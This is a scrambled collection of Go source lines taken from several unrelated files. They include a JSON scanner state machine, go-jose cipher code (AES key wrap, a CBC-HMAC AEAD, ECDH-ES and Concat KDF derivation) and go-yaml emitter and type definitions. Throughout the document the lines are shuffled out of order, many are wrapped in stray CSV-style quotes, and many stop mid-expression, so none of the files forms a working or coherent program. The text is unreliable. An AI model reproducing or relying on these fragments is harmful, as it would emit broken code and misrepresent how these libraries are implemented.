"// stateDot is the state after reading the integer and decimal point in a number,"
// A scanner is a JSON scanning state machine.
"return stateEndTop(s, c)"
redo      bool
func stateBeginValueOrEmpty(s 
// stateNul is the state after reading 
// caller can follow along if it wishes.
func stateInStringEscU12(s 
s.step = stateInStringEscU12
"s.error(c, ""after top-level value"")"
s.step = stateESign
return 
func stateE(s 
// stateFals is the state after reading 
"[""x"""
// It is okay to ignore the return value of any particular
func isSpace(c byte) bool {
 this byte
s.step = stateF
// returning that value and the bytes that follow it as separate slices.
"return s.error(c, ""in literal false (expecting 'l')"")"
scanner) popParseState() {
s.step = stateEndTop
s.redoCode = scanCode
"return s.error(c, """")"
if c == 'r' {
// special cases - different from quoted strings
// stateInStringEscU1 is the state after reading 
"return s.error(c, ""looking for beginning of object key string"")"
"return s.error(c, ""in literal false (expecting 'e')"")"
// stateInStringEscU12 is the state after reading 
// numbers
s.step = stateNul
// scan is passed in for use by checkValid to avoid an allocation.
scanEnd   // top-level value ended 
// probe the scanner with a space to determine whether we will
// assigned to scanner.state and the method scanner.eof.
"// stateEndTop is the state after finishing the top-level value,"
const (
// stateBeginValueOrEmpty is the state after reading 
"for i, c := range data {"
n := len(s.parseState)
SyntaxError) Error() string { return e.msg }
// They give details about the current state of the scan that
// undo causes the scanner to return scanCode from the next state transition.
if c == 'l' {
scanner) pushParseState(p int) {
s.step = stateFa
func stateNul(s 
case '-':
"return s.error(c, ""looking for beginning of value"")"
// by calling scan.step(
type scanner struct {
// stateN is the state after reading 
scan.reset()
scanEndObject           // end object (implies scanObjectValue if possible)
"return s.error(c, ""in literal true (expecting 'r')"")"
if '1' <= c 
" ""'"""
n' {
// JSON value parser state machine.
func quoteChar(c byte) string {
 c <= 'f' 
if c == '0' {
func stateT(s 
"// stateDot0 is the state after reading the integer, decimal point, and subsequent"
scanBeginObject         // begin object
 can skip
"// the parseState describes the nested state, outermost at entry 0."
if c == ':' {
// such as after reading 
if c == 'u' {
 c != '
if c != ' ' 
// quoteChar formats c as a quoted character literal
// Callers call scan.reset() and then pass bytes in one at a time
"return s.error(c, ""in literal false (expecting 's')"")"
// Continue.
if c == 'e' 
"scanner) error(c byte, context string) int {"
"return s.error(c, ""in literal true (expecting 'e')"")"
"return s.error(c, ""after object key:value pair"")"
"// nextValue splits data after the next whole JSON value,"
// stateInString is the state after reading 
// Just about at the limit of what is reasonable to write by hand.
func stateN(s 
if c == '.' {
"return data, nil, nil"
"return s.error(c, ""in literal null (expecting 'u')"")"
s.parseState[n-1] = parseObjectKey
"return s.error(c, ""in literal true (expecting 'u')"")"
"v := scan.step(scan, c)"
ps := s.parseState[n-1]
case '[':
"scanner, byte) int"
s.step = stateBeginValueOrEmpty
return scanBeginLiteral
// use quoted string with different quotation marks
return scanContinue
314e
"// stateE is the state after reading the mantissa and e in a number,"
parseState []int
switch ps {
if c == 'a' {
 or 
parseArrayValue         // parsing array value
scanContinue     = iota // uninteresting byte
" known to be first ""stop"" result"
case '0': // beginning of 0.123
"panic(""json: invalid use of scanner"")"
if '0' <= c 
s.step = stateTr
scanner) error {
"// state1 is the state after reading a non-zero integer during a number,"
// reset prepares the scanner for use.
return s.redoCode
5.1.2
s.endTop = false
"[1,2,3]"
n := len(s.parseState) - 1
// and updates s.step accordingly.
func stateFa(s 
s.step = state0
"return s.error(c, ""in string escape code"")"
" context, s.bytes}"
// Copyright 2010 The Go Authors.  All rights reserved.
// stateRedo helps implement the scanner's 1-byte undo.
if s.err == nil {
func stateFal(s 
func stateInStringEscU(s 
s.step = stateE
 c <= '9' 
func (s 
"return s.error(c, ""after object key"")"
case scanEnd:
if s.err != nil {
return scanArrayValue
redoCode  int
"// stateEndValue is the state after completing a value,"
"// Error that happened, if any."
"func checkValid(data []byte, scan "
"func nextValue(data []byte, scan "
// It returns a scan status just as s.step does.
func stateE0(s 
func state0(s 
if c == '}' {
"return s.error(c, ""in literal false (expecting 'a')"")"
314e-
// Only space characters should be seen now.
return nil
"if c == '""' {"
s.step = stateEndValue
scanObjectKey           // just finished object key (string)
scanSkipSpace           // space byte
scanner) undo(scanCode int) {
// checkValid verifies that data is valid JSON-encoded data.
 the byte that
s.err = nil
"return s.error(c, ""in numeric literal"")"
 quoteChar(c) 
func stateFals(s 
return scanEnd
func stateNeg(s 
"// Some parts are a bit tedious, but overall it nicely factors out the"
"// get scanEnd on the next character. Otherwise, if the next character"
if c < 0x20 {
"for _, c := range data {"
// This gives callers a simple 1-byte undo mechanism.
// stateBeginStringOrEmpty is the state after reading 
func stateTr(s 
"SyntaxError{""invalid character "" "
// scan is passed in for use by nextValue to avoid an allocation.
 isSpace(c) {
"scan, c) for each byte."
 c <= 'F' {
s.step = stateInString
// stateInStringEsc is the state after reading 
func stateInStringEscU123(s 
 c == '
fals
return scanError
func state1(s 
// A SyntaxError is a description of a JSON syntax error.
// license that can be found in the LICENSE file.
"return s.error(c, ""in literal null (expecting 'l')"")"
"// call to scanner.state: if one call returns scanError,"
"return stateBeginString(s, c)"
scanEndArray            // end array (implies scanArrayValue if possible)
s.popParseState()
"scanner, c byte) int {"
scanArrayValue          // just finished array value
scanBeginArray          // begin array
"1:], nil"
return scanBeginObject
s.endTop = true
// Reached end of top-level value.
parseObjectKey   = iota // parsing object key (before colon)
// stateF is the state after reading 
true
// error records an error and switches to the error state.
before
case 't': // beginning of true
"return s.error(c, ""in string literal"")"
switch v {
s.step = stateE0
package json
// 1-byte redo (see undo method)
"// total bytes consumed, updated by decoder.Decode"
 'a' <= c 
func stateDot(s 
"// on a 64-bit Mac Mini, and it's nicer to read."
"return nil, nil, scan.err"
if n == 0 {
// caller about significant parsing events like beginning
// They give the current state of a composite value
"// Stack of what we're in the middle of - array values, object keys, object values."
"SyntaxError{""unexpected end of JSON input"", s.bytes}"
"return s.error(c, ""after decimal point in numeric literal"")"
bytes int64
"if scan.step(scan, ' ') == scanEnd {"
// The return value scanEnd indicates that a single top-level
s.step = stateBeginStringOrEmpty
return scan.err
// stateInStringEscU is the state after reading 
func stateError(s 
return scanEndObject
func stateRedo(s 
return scanObjectKey
func stateBeginStringOrEmpty(s 
return data[:i
"return ""'"" "
3.14e0
func stateBeginValue(s 
"// in this package (Compact, Indent, checkValid, nextValue, etc)."
s.err = 
for i := range r {
 it unwraps a content encryption key (cek) with the given block cipher.
 tBytes[i]
 limitations under the License.
 t >= 0
buffer[i] = buffer[i] 
"r[i] = make([]byte, 8)"
import (
copy(out[(i
"8:], r[i])"
package josecipher
"copy(r[i], cek[i"
"copy(buffer[8:], r[t%n])"
copy(out[i
"copy(buffer, defaultIV)"
 You may obtain a copy of the License at
"var defaultIV = []byte{0xA6, 0xA6, 0xA6, 0xA6, 0xA6, 0xA6, 0xA6, 0xA6}"
"""crypto/subtle"""
 you may not use this file except in compliance with the License.
"copy(r[t%n], buffer[8:])"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
for t := 0
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"block.Encrypt(buffer, buffer)"
if len(cek)%8 != 0 {
"r := make([][]byte, n)"
"if subtle.ConstantTimeCompare(buffer[:8], defaultIV) == 0 {"
"func KeyUnwrap(block cipher.Block, ciphertext []byte) ([]byte, error) {"
for t := 6
"""crypto/cipher"""
n := (len(ciphertext) / 8) - 1
"return nil, errors.New(""square/go-jose: failed to unwrap key"")"
 See the License for the specific language governing permissions and
for i := 0
"copy(out, buffer[:8])"
"return out, nil"
 t < 6
 i < 8
"""encoding/binary"""
"tBytes := make([]byte, 8)"
"func KeyWrap(block cipher.Block, cek []byte) ([]byte, error) {"
// KeyUnwrap implements NIST key unwrapping
 t-- {
"buffer := make([]byte, 16)"
"return nil, errors.New(""square/go-jose: key wrap input must be 8 byte blocks"")"
"block.Decrypt(buffer, buffer)"
 it wraps a content encryption key (cek) with the given block cipher.
"out := make([]byte, n"
if len(ciphertext)%8 != 0 {
     http://www.apache.org/licenses/LICENSE-2.0
"copy(r[i], ciphertext[(i"
" Unless required by applicable law or agreed to in writing, software"
"binary.BigEndian.PutUint64(tBytes, uint64(t"
"""errors"""
n := len(cek) / 8
"out := make([]byte, (n"
"copy(buffer[:8], ciphertext[:8])"
n - 1
// KeyWrap implements NIST key wrapping
8:])
"authtagBytes: keySize,"
"copy(out[len(ciphertext):], authtag)"
"buffer := make([]byte, uint64(len(aad))"
"ciphertext := make([]byte, uint64(len(plaintext))"
"= copy(buffer[n:], ciphertext)"
"""hash"""
cbcAEAD) NonceSize() int {
package josecipher
// Remove padding
hash = sha512.New
head = in[:n]
"integrityKey: integrityKey,"
// Seal encrypts and authenticates the plaintext.
 ctx.authtagBytes
return ctx.blockCipher.BlockSize() 
"ret, out := resize(buffer, uint64(len(buffer))"
// the length of the auth tag is equivalent to the key size.
var hash func() hash.Hash
"return nil, errors.New(""square/go-jose: invalid ciphertext (invalid length)"")"
"ciphertext = padBuffer(ciphertext, ctx.blockCipher.BlockSize())"
uint64(ctx.Overhead()))[:len(plaintext)]
cbcAEAD{
authtagBytes int
"""bytes"""
"blockCipher, err := newBlockCipher(encryptionKey)"
uint64(len(nonce))
switch keySize {
"// If the capacity of the slice is less than n, a new slice is allocated"
func (ctx 
keySize := len(key) / 2
"""errors"""
blockCipher  cipher.Block
"= copy(buffer, aad)"
"cbc.CryptBlocks(buffer, buffer)"
hash = sha512.New384
"cbc := cipher.NewCBCEncrypter(ctx.blockCipher, nonce)"
"func resize(in []byte, n uint64) (head, tail []byte) {"
"copy(ciphertext, plaintext)"
n := 0
"match := subtle.ConstantTimeCompare(expectedTag, ciphertext[offset:])"
"// Make copy of ciphertext buffer, don't want to modify in place"
"// Maximum overhead is block size (for padding) plus auth tag length, where"
// Compute an authentication tag
// resize ensures the the given slice has a capacity of at least n bytes.
if count == 0 
"""crypto/subtle"""
"copy(out, ciphertext)"
"return nil, errors.New(""square/go-jose: invalid ciphertext (auth tag mismatch)"")"
"cbc := cipher.NewCBCDecrypter(ctx.blockCipher, nonce)"
"return nil, errors.New(""square/go-jose: invalid ciphertext (too short)"")"
return hmac.Sum(nil)[:ctx.authtagBytes]
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"binary.BigEndian.PutUint64(buffer[n:], uint64(len(aad))"
"_, _ = hmac.Write(buffer)"
nonceBytes = 16
"ret, out := resize(dst, uint64(len(dst))"
"hash:         hash,"
if len(ciphertext) < ctx.authtagBytes {
integrityKey := key[:keySize]
hash = sha256.New
"= copy(buffer[n:], nonce)"
 See the License for the specific language governing permissions and
"func NewCBCHMAC(key []byte, newBlockCipher func([]byte) (cipher.Block, error)) (cipher.AEAD, error) {"
"cbcAEAD) Seal(dst, nonce, plaintext, data []byte) []byte {"
"""encoding/binary"""
"padding := bytes.Repeat([]byte{byte(missing)}, missing)"
} else {
"""crypto/sha512"""
"""crypto/sha256"""
offset := len(ciphertext) - ctx.authtagBytes
"""crypto/hmac"""
case 24:
// Apply padding
if err != nil {
"authtag := ctx.computeAuthTag(data, nonce, ciphertext)"
"buffer := append([]byte{}, []byte(ciphertext[:offset])...)"
"cbc.CryptBlocks(ciphertext, ciphertext)"
import (
// Output buffer -- must take care not to mangle plaintext input.
"cbcAEAD) Open(dst, nonce, ciphertext, data []byte) ([]byte, error) {"
integrityKey []byte
last := buffer[len(buffer)-1]
uint64(missing))
type cbcAEAD struct {
"copy(head, in)"
count := int(last)
 you may not use this file except in compliance with the License.
uint64(len(ciphertext))
" distributed under the License is distributed on an ""AS IS"" BASIS,"
case 32:
HMAC
HMAC.
if len(buffer)%ctx.blockCipher.BlockSize() > 0 {
 count > blockSize 
"""crypto/cipher"""
"expectedTag := ctx.computeAuthTag(data, nonce, ciphertext[:offset])"
"}, nil"
cbcAEAD) Overhead() int {
case 16:
" Unless required by applicable law or agreed to in writing, software"
return nonceBytes
"hmac := hmac.New(ctx.hash, ctx.integrityKey)"
encryptionKey := key[keySize:]
"return nil, errors.New(""square/go-jose: invalid padding"")"
tail = head[len(in):]
return 
 limitations under the License.
"return nil, err"
if uint64(cap(in)) >= n {
"copy(out, plaintext)"
"copy(out, padding)"
"if !bytes.HasSuffix(buffer, padding) {"
"head = make([]byte, n)"
return ret
 You may obtain a copy of the License at
uint64(len(authtag)))
// and the existing data will be copied.
hash         func() hash.Hash
"func padBuffer(buffer []byte, blockSize int) []byte {"
" Licensed under the Apache License, Version 2.0 (the ""License"")"
// An AEAD based on CBC
"return ret, nil"
"func unpadBuffer(buffer []byte, blockSize int) ([]byte, error) {"
 count > len(buffer) {
"return buffer[:len(buffer)-count], nil"
"cbcAEAD) computeAuthTag(aad, nonce, ciphertext []byte) []byte {"
"// According to documentation, Write() on hash.Hash never fails."
// Open decrypts and authenticates the ciphertext.
"blockCipher:  blockCipher,"
"padding := bytes.Repeat([]byte{last}, count)"
if match != 1 {
uint64(len(plaintext)))
if len(buffer)%blockSize != 0 {
     http://www.apache.org/licenses/LICENSE-2.0
// NewCBCHMAC instantiates a new AEAD based on CBC
return
missing := blockSize - (len(buffer) % blockSize)
"plaintext, err := unpadBuffer(buffer, ctx.blockCipher.BlockSize())"
const (
 limitations under the License.
import (
package josecipher
"ecdsa.PrivateKey, pub "
"binary.BigEndian.PutUint32(supPubInfo, uint32(size)"
"if !priv.PublicKey.Curve.IsOnCurve(pub.X, pub.Y) {"
"_, _ = reader.Read(key)"
"""crypto/ecdsa"""
 You may obtain a copy of the License at
"z, _ := priv.PublicKey.Curve.ScalarMult(pub.X, pub.Y, priv.D.Bytes())"
// suppPubInfo is the encoded length of the output size in bits
return key
"binary.BigEndian.PutUint32(out, uint32(len(data)))"
 you may not use this file except in compliance with the License.
" Licensed under the Apache License, Version 2.0 (the ""License"")"
// curve. Callers must ensure that the keys are valid before calling this function. Output
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
" distributed under the License is distributed on an ""AS IS"" BASIS,"
// It is an error to call this function with a private/public key that are not on the same
ptyVInfo := lengthPrefixed(apvData)
"func DeriveECDHES(alg string, apuData, apvData []byte, priv "
// size may be at most 1<<16 bytes (64 KiB).
"""crypto"""
 See the License for the specific language governing permissions and
"copy(out[4:], data)"
// Read on the KDF will never fail
algID := lengthPrefixed([]byte(alg))
func lengthPrefixed(data []byte) []byte {
"""encoding/binary"""
"ecdsa.PublicKey, size int) []byte {"
"out := make([]byte, len(data)"
if size > 1<<16 {
     http://www.apache.org/licenses/LICENSE-2.0
return out
" Unless required by applicable law or agreed to in writing, software"
// DeriveECDHES derives a shared encryption key using ECDH/ConcatKDF as described in JWE/JWA.
"panic(""ECDH-ES output size too large, must be less than or equal to 1<<16"")"
"key := make([]byte, size)"
"// algId, partyUInfo, partyVInfo inputs must be prefixed with the length"
ptyUInfo := lengthPrefixed(apuData)
"panic(""public key not on same curve as private key"")"
"reader := NewConcatKDF(crypto.SHA256, z.Bytes(), algID, ptyUInfo, ptyVInfo, supPubInfo, []byte{})"
"supPubInfo := make([]byte, 4)"
 limitations under the License.
"info:   buffer,"
import (
"""hash"""
package josecipher
"z:      z,"
"buffer := make([]byte, uint64(len(algID))"
 You may obtain a copy of the License at
ctx.cache = ctx.cache[copied:]
uint64(len(supPubInfo))
copied 
"= copy(buffer[n:], ptyUInfo)"
"i:      1,"
type concatKDF struct {
"func NewConcatKDF(hash crypto.Hash, z, algID, ptyUInfo, ptyVInfo, supPubInfo, supPrivInfo []byte) io.Reader {"
 you may not use this file except in compliance with the License.
ctx.cache = hash[chunkCopied:]
ctx.i
" Licensed under the Apache License, Version 2.0 (the ""License"")"
 Copyright 2014 Square Inc.
" WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
" distributed under the License is distributed on an ""AS IS"" BASIS,"
"z, info []byte"
"cache:  []byte{},"
hasher  hash.Hash
"concatKDF) Read(out []byte) (int, error) {"
cache   []byte
= chunkCopied
ctx.hasher.Reset()
"""crypto"""
uint64(len(ptyUInfo))
"copied := copy(out, ctx.cache)"
 See the License for the specific language governing permissions and
"= copy(buffer, algID)"
"""io"""
i       uint32
"chunkCopied := copy(out[copied:], hash)"
"return copied, nil"
// NewConcatKDF builds a KDF reader based on the given inputs.
"""encoding/binary"""
"hasher: hasher,"
func (ctx 
"_, _ = ctx.hasher.Write(ctx.info)"
for copied < len(out) {
hasher := hash.New()
"= copy(buffer[n:], ptyVInfo)"
     http://www.apache.org/licenses/LICENSE-2.0
uint64(len(supPrivInfo)))
"= copy(buffer[n:], supPubInfo)"
" Unless required by applicable law or agreed to in writing, software"
concatKDF{
"copy(buffer[n:], supPrivInfo)"
// Write on a hash.Hash never fails
hash := ctx.hasher.Sum(nil)
uint64(len(ptyVInfo))
return 
"_, _ = ctx.hasher.Write(ctx.z)"
n := 0
"_ = binary.Write(ctx.hasher, binary.BigEndian, ctx.i)"
func yaml_emitter_flush(emitter 
if emitter.buffer_pos == 0 {
emitter.error = yaml_WRITER_ERROR
"panic(""write handler not set"")"
package yaml
"if err := emitter.write_handler(emitter, emitter.buffer[:emitter.buffer_pos])"
"return yaml_emitter_set_writer_error(emitter, ""write error: """
"yaml_emitter_t, problem string) bool {"
return false
err.Error())
// Check if the buffer is empty.
 err != nil {
// Flush the output buffer.
func yaml_emitter_set_writer_error(emitter 
emitter.problem = problem
// Set the writer error and return false.
return true
if emitter.write_handler == nil {
yaml_emitter_t) bool {
emitter.buffer_pos = 0
yaml_MAPPING_NODE  // A mapping node.
yaml_PARSE_IMPLICIT_DOCUMENT_START_STATE           // Expect the beginning of an implicit document.
tag_directives_data  []yaml_tag_directive_t
// The information associated with the document nodes.
closed bool // If the stream was already closed
"return ""yaml_PARSE_FLOW_SEQUENCE_FIRST_ENTRY_STATE"""
case yaml_PARSE_FLOW_SEQUENCE_FIRST_ENTRY_STATE:
"yaml_MAPPING_END_EVENT:    ""mapping end"","
case yaml_FLOW_MAPPING_START_TOKEN:
document 
case yaml_FLOW_SEQUENCE_END_TOKEN:
error   yaml_error_type_t // Error type.
"return ""yaml_PARSE_FLOW_MAPPING_VALUE_STATE"""
yaml_UTF8_ENCODING    // The default UTF-8 encoding.
// The stream encoding.
yaml_PARSE_FLOW_MAPPING_FIRST_KEY_STATE            // Expect the first key of a flow mapping.
type yaml_node_type_t int
yaml_PLAIN_SCALAR_STYLE         // The plain scalar style.
case yaml_PARSE_IMPLICIT_DOCUMENT_START_STATE:
yaml_MAPPING_START_EVENT  // A MAPPING-START event.
"// @param[in,out]   data        A pointer to an application data specified by"
// The emitter structure.
case yaml_VALUE_TOKEN:
// All members are internal. Manage the structure using the
yaml_MEMORY_ERROR   // Cannot allocate or reallocate a block of memory.
encoding yaml_encoding_t // The stream encoding.
type yaml_event_type_t int8
return eventStrings[e]
yaml_EMIT_END_STATE                        // Expect nothing.
"yaml_FLOAT_TAG     = ""tag:yaml.org,2002:float""     // The tag !!float for float values."
// The byte about which the problem occurred.
type yaml_mapping_style_t yaml_style_t
context_mark yaml_mark_t
yaml_document_t // The currently emitted document.
version_directive 
"yaml_parser_t, buffer []byte) (n int, err error)"
read_handler yaml_read_handler_t // Read handler.
// Emitter Definitions
switch tt {
yaml_NO_NODE yaml_node_type_t = iota
yaml_VERSION_DIRECTIVE_TOKEN // A VERSION-DIRECTIVE token.
case yaml_VERSION_DIRECTIVE_TOKEN:
indent  int   // The current indentation level.
yaml_PARSER_ERROR   // Cannot parse the input stream.
"yaml_STREAM_START_EVENT:   ""stream start"","
case yaml_PARSE_BLOCK_SEQUENCE_FIRST_ENTRY_STATE:
yaml_PARSE_DOCUMENT_START_STATE                    // Expect DOCUMENT-START.
// Writer stuff
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE:
case yaml_PARSE_DOCUMENT_END_STATE:
// The pointer position.
type yaml_encoding_t int
end_implicit   int // Is the document end indicator implicit
column int // The position column.
"return ""yaml_PARSE_DOCUMENT_CONTENT_STATE"""
yaml_DEFAULT_SCALAR_TAG   = yaml_STR_TAG // The default scalar tag is !!str.
major int8 // The major version number.
"yaml_NULL_TAG      = ""tag:yaml.org,2002:null""      // The tag !!null with the only possible value: null."
// The error context.
case yaml_BLOCK_END_TOKEN:
"start_mark, end_mark yaml_mark_t"
yaml_FOLDED_SCALAR_STYLE        // The folded scalar style.
yaml_PARSE_BLOCK_MAPPING_KEY_STATE                 // Expect a block mapping key.
case yaml_PARSE_FLOW_NODE_STATE:
"return ""yaml_FLOW_SEQUENCE_START_TOKEN"""
"return ""yaml_VALUE_TOKEN"""
// The tag suffix (for yaml_TAG_TOKEN).
case yaml_DOCUMENT_END_TOKEN:
// [out]      buffer      The buffer to write the data from the source.
type yaml_token_type_t int
// The node structure.
"return ""yaml_PARSE_BLOCK_MAPPING_VALUE_STATE"""
yaml_VALUE_TOKEN       // A VALUE token.
unicode     bool         // Allow unescaped non-ASCII characters
yaml_BLOCK_END_TOKEN            // A BLOCK-END token.
// The scalar parameters (for yaml_SCALAR_NODE).
yaml_BLOCK_MAPPING_STYLE // The block mapping style.
 (for yaml_SCALAR_EVENT).
yaml_BLOCK_MAPPING_START_TOKEN  // A BLOCK-SEQUENCE-END token.
pairs_end   
yaml_SCALAR_TOKEN // A SCALAR token.
line       int  // The current line.
yaml_EMIT_FLOW_MAPPING_SIMPLE_VALUE_STATE  // Expect a value for a simple key of a flow mapping.
// An empty event.
yaml_PARSE_BLOCK_NODE_OR_INDENTLESS_SEQUENCE_STATE // Expect a block node or indentless sequence.
items_data []yaml_node_item_t    // The stack of sequence items.
pairs_start 
"return ""yaml_FLOW_SEQUENCE_END_TOKEN"""
// The document structure.
// Anchor analysis.
indents []int // The stack of indentation levels.
nodes []yaml_node_t
// Tag analysis.
style                 yaml_scalar_style_t // The output style.
// The emitter states.
yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE // Expect a value of an ordered mapping.
yaml_READER_ERROR   // Cannot read or decode the input stream.
"// [in,out]   data        A pointer to an application data specified by"
"return ""yaml_DOCUMENT_START_TOKEN"""
case yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE:
tag_data struct {
// Error handling
case yaml_FLOW_MAPPING_END_TOKEN:
"return ""yaml_PARSE_BLOCK_MAPPING_KEY_STATE"""
"return ""yaml_PARSE_END_STATE"""
sequence struct {
indent int // The current indentation level.
func (e 
"return ""yaml_PARSE_BLOCK_NODE_STATE"""
case yaml_TAG_TOKEN:
yaml_UTF16LE_ENCODING // The UTF-16-LE encoding with BOM.
problem_value  int
"""io"""
tag []byte
case yaml_PARSE_FLOW_MAPPING_EMPTY_VALUE_STATE:
// The version directive.
// The scalar value (for yaml_SCALAR_EVENT).
yaml_SCALAR_EVENT         // A SCALAR event.
// the returned value should be @c 0.
"yaml_SCALAR_EVENT:         ""scalar"","
yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE              // Expect an entry of a block sequence.
mark   yaml_mark_t // The mark of the current position.
yaml_DOCUMENT_START_EVENT // A DOCUMENT-START event.
alias  bool   // Is it an alias
stream_start_produced bool // Have we started to scan the input stream
// The write handler is called when the emitter needs to flush the accumulated
"// The anchor (for yaml_SCALAR_EVENT, yaml_SEQUENCE_START_EVENT, yaml_MAPPING_START_EVENT, yaml_ALIAS_EVENT)."
quoted_implicit bool
"yaml_STR_TAG       = ""tag:yaml.org,2002:str""       // The tag !!str for string values."
package yaml
"return ""<unknown parser state>"""
"', ':')"
yaml_PARSE_DOCUMENT_CONTENT_STATE                  // Expect the content of a document.
single_quoted_allowed bool                // Can the scalar be expressed in the single quoted style
mapping struct {
indents []int // The indentation levels stack.
yaml_EMIT_BLOCK_MAPPING_KEY_STATE          // Expect the key of a block mapping.
pairs_top   
"yaml_BINARY_TAG = ""tag:yaml.org,2002:binary"""
"return fmt.Sprintf(""unknown event %d"", e)"
yaml_STREAM_END_EVENT     // A STREAM-END event.
case yaml_PARSE_BLOCK_MAPPING_KEY_STATE:
"return ""yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE"""
// The version directive data.
// Many bad things could happen with the parser and emitter.
"// The style (for yaml_SCALAR_EVENT, yaml_SEQUENCE_START_EVENT, yaml_MAPPING_START_EVENT)."
"yaml_DOCUMENT_END_EVENT:   ""document end"","
// Event types.
// Node Styles
anchor     int  // The anchor id.
yaml_LN_BREAK   // Use LN for line breaks (Unix style).
yaml_node_pair_t    // The beginning of the stack.
events      []yaml_event_t // The event queue.
output_writer io.Writer // File output data.
yaml_ANY_SEQUENCE_STYLE yaml_sequence_style_t = iota
"yaml_TIMESTAMP_TAG = ""tag:yaml.org,2002:timestamp"" // The tag !!timestamp for date and time values."
yaml_SEQUENCE_NODE // A sequence node.
yaml_ANY_MAPPING_STYLE yaml_mapping_style_t = iota
flow_plain_allowed    bool                // Can the scalar be expessed in the flow plain style
case yaml_PARSE_DOCUMENT_START_STATE:
typ yaml_token_type_t
best_width  int          // The preferred width of the output lines.
// Token types.
"yaml_ALIAS_EVENT:          ""alias"","
type yaml_version_directive_t struct {
// Scalar analysis.
input_pos    int
case yaml_TAG_DIRECTIVE_TOKEN:
state  yaml_emitter_state_t   // The current emitter state.
"return ""yaml_PARSE_STREAM_START_STATE"""
simple_key_context bool // Is it a simple mapping key context
problem string            // Error description.
"return ""yaml_FLOW_MAPPING_START_TOKEN"""
// Tokens
// An empty token.
yaml_PARSE_FLOW_MAPPING_VALUE_STATE                // Expect a value of a flow mapping.
yaml_STREAM_START_EVENT   // A STREAM-START event.
"return ""yaml_BLOCK_SEQUENCE_START_TOKEN"""
yaml_EMIT_DOCUMENT_CONTENT_STATE           // Expect the content of a document.
yaml_PARSE_BLOCK_MAPPING_VALUE_STATE               // Expect a block mapping value.
// yaml_parser_ family of functions.
"return ""yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_KEY_STATE"""
mark         yaml_mark_t // The position mark.
raw_buffer     []byte // The raw buffer.
"return ""yaml_PARSE_FLOW_MAPPING_FIRST_KEY_STATE"""
marks          []yaml_mark_t          // The stack of marks.
yaml_EMIT_DOCUMENT_START_STATE             // Expect DOCUMENT-START or STREAM-END.
value []byte
start_implicit int // Is the document start indicator implicit
anchor []byte
yaml_CRLN_BREAK // Use CR LN for line breaks (DOS style).
scalar struct {
"""fmt"""
yaml_DOUBLE_QUOTED_SCALAR_STYLE // The double-quoted scalar style.
// An element of a mapping node.
yaml_FLOW_MAPPING_STYLE  // The flow mapping style.
yaml_PARSE_BLOCK_NODE_STATE                        // Expect a block node.
problem_mark   yaml_mark_t
type yaml_scalar_style_t yaml_style_t
yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE               // Expect an entry of a flow sequence.
token_available bool           // Does the tokens queue contain a token ready for dequeueing.
// The prototype of a write handler.
"return ""yaml_TAG_DIRECTIVE_TOKEN"""
yaml_BLOCK_ENTRY_TOKEN // A BLOCK-ENTRY token.
yaml_document_t // The currently parsed document.
case yaml_BLOCK_ENTRY_TOKEN:
yaml_SCANNER_ERROR  // Cannot scan the input stream.
raw_buffer_pos int    // The current position of the buffer.
style      yaml_sequence_style_t // The sequence style.
tokens_head     int            // The head of the tokens queue.
// Nodes
context      string
yaml_EMIT_BLOCK_SEQUENCE_FIRST_ITEM_STATE  // Expect the first item of a block sequence.
// Parser stuff
states         []yaml_parser_state_t  // The parser states stack.
"return ""yaml_PARSE_DOCUMENT_END_STATE"""
yaml_EMIT_BLOCK_SEQUENCE_ITEM_STATE        // Expect an item of a block sequence.
input_reader io.Reader // File input data.
yaml_PARSE_STREAM_START_STATE yaml_parser_state_t = iota
tag_directives []yaml_tag_directive_t // The list of TAG directives.
type yaml_node_t struct {
yaml_FLOW_MAPPING_START_TOKEN  // A FLOW-MAPPING-START token.
open_ended bool // If an explicit document end is required
struct {
// Dumper stuff
possible     bool        // Is a simple key possible
yaml_DEFAULT_MAPPING_TAG  = yaml_MAP_TAG // The default mapping tag is !!map.
// [out]      size_read   The actual number of bytes read from the source.
// Node types.
unread int // The number of unread characters in the buffer.
// The tag directive data.
yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE         // Expect an entry of an indentless sequence.
references int  // The number of references.
yaml_BLOCK_SEQUENCE_STYLE // The block sequence style.
typ yaml_node_type_t // The node type.
suffix []byte // The tag suffix.
// Reader stuff
// Not in original libyaml.
offset int         // The offset of the current position (in bytes).
"return ""yaml_PARSE_FLOW_MAPPING_KEY_STATE"""
anchor []byte      // The anchor.
problem string // Error description.
 int(e) >= len(eventStrings) {
"yaml_NO_EVENT:             ""none"","
// Events
case yaml_ANCHOR_TOKEN:
// characters to the output.  The handler should write @a size bytes of the
// @param[in]       size        The size of the buffer.
// source. The handler should write not more than size bytes to the buffer.
// size_read to 0 and return 1.
yaml_PARSE_BLOCK_MAPPING_FIRST_KEY_STATE           // Expect the first key of a block mapping.
// Let the emitter choose the style.
style  yaml_scalar_style_t // The scalar style.
yaml_ALIAS_TOKEN  // An ALIAS token.
const (
yaml_PARSE_FLOW_MAPPING_KEY_STATE                  // Expect a key of a flow mapping.
tokens_parsed   int            // The number of tokens fetched from the queue.
// Expect STREAM-START.
yaml_EMIT_BLOCK_MAPPING_VALUE_STATE        // Expect a value of a block mapping.
implicit bool
"return ""yaml_BLOCK_END_TOKEN"""
"indention  bool // If the last character was an indentation character (' ', '-', '"
// [in]       size        The size of the buffer.
mapping_context    bool // Is it a mapping context
yaml_FLOW_SEQUENCE_STYLE  // The flow sequence style.
yaml_EMIT_BLOCK_MAPPING_SIMPLE_VALUE_STATE // Expect a value for a simple key of a block mapping.
yaml_COMPOSER_ERROR // Cannot compose a YAML document.
yaml_DOCUMENT_END_TOKEN      // A DOCUMENT-END token.
